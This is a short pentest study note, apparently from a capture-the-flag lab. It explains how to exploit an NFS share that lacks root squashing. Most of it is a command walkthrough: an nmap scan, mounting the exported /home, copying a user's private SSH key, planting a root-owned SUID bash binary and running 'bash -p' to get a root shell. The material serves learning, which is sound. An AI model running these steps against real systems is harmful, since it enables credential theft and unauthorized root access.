If [root Squasing](Network%20Services.md#root%20squashing) isnt configured it can be exploited:

SUID (bit set) = specific linux authorization method to execute Files with every User as Owner/Group (like a superuser)

Download: [Standard Ubuntu Server 18.04 Bash Executable](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)

```
cd /downloads/
sudo chown root bash
cp /downloads/bash /nfs/home/bash
sudo chmod +s /nfs/home/bash
ssh -i id_rsa xxx@ip
./bash -p
```

- needs NFS + SSH access
- -p = persists the permission, so SUID can be executed as root, else permissions could be dropped
- +s = SUI Permission so we can execute files with other users as owner

Example:

``` 
nmap -A --top-ports 100 10.10.128.227

        Nmap scan report for ip-10-10-128-227.eu-west-1.compute.internal (10.10.128.227)
	Host is up (0.00090s latency).
	Not shown: 97 closed ports
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
	|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
	|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (EdDSA)
	111/tcp  open  rpcbind 2-4 (RPC #100000)
	| rpcinfo: 
	|   program version   port/proto  service
	|   100000  2,3,4        111/tcp  rpcbind
	|   100000  2,3,4        111/udp  rpcbind
	|   100003  3           2049/udp  nfs
	|   100003  3,4         2049/tcp  nfs
	|   100005  1,2,3      35337/udp  mountd
	|   100005  1,2,3      56859/tcp  mountd
	|   100021  1,3,4      35347/udp  nlockmgr
	|   100021  1,3,4      39613/tcp  nlockmgr
	|   100227  3           2049/tcp  nfs_acl
	|_  100227  3           2049/udp  nfs_acl
	2049/tcp open  nfs_acl 3 (RPC #100227)
	MAC Address: 02:AD:DB:09:B1:93 (Unknown)
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.60%E=4%D=7/19%OT=22%CT=7%CU=42941%PV=Y%DS=1%DC=D%G=Y%M=02ADDB%T
	OS:M=62D65C3C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A
	OS:)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5
	OS:=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W
	OS:6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
	OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
	OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
	OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
	OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
	OS:I=N%T=40%CD=S)

	Network Distance: 1 hop
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	TRACEROUTE
	HOP RTT     ADDRESS
	1   0.90 ms ip-10-10-128-227.eu-west-1.compute.internal (10.10.128.227)

	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds

/usr/sbin/showmount -e 10.10.128.227
        
        Export list for 10.10.128.227:
        /home *
   
mkdir /tmp/mount
sudo mount -t nfs 10.10.128.227:home /tmp/mount/ -nolock
cd /tmp/mount
cd cappucino/.ssh
cp id_rsa /tmp/id_rsa
vi id_rsa.pub
cd /tmp
ssh -i id_rsa cappucino@10.10.128.227
exit()
download https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
sudo chown root bash
cd /tmp/mountcappucino/
cp /root/downloads/bash .
sudo chmod +s bash
ls -lisa
	-rwsr-sr-x 1 root   root   1113504 Jul 19 10:16 bash*
ssh -i id_rsa cappucino@10.10.128.227
./bash -p
cd /root/
```